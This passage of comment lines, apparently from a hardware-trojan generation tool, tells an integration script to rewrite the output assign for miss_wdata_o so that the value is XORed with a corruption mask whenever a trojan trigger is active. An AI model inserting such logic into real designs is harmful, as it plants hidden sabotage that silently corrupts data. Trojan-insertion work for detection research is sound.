...
//
// IMPORTANT: miss_wdata_o may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If miss_wdata_o is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for miss_wdata_o (or first output assign):
//     assign miss_wdata_o = <expr>;
//   Replace with:
//     assign miss_wdata_o = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
